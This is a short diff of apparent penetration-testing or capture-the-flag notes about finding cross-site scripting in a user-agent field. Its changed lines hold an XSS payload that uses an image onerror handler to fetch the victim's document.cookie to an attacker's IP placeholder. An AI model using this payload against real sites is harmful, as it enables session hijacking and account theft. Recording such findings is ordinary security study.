@@ -14,5 +14,5 @@ so lets try replacing those:
 and in the user agent we get an xss
 
 now trying to return the cookie to my server:
-<img src=x onerror=fetch('http://{your ip}/'+document.cookie);>
+<img src=x onerror="fetch('http://{your ip}/' + document.cookie);">
 this should return the cookie
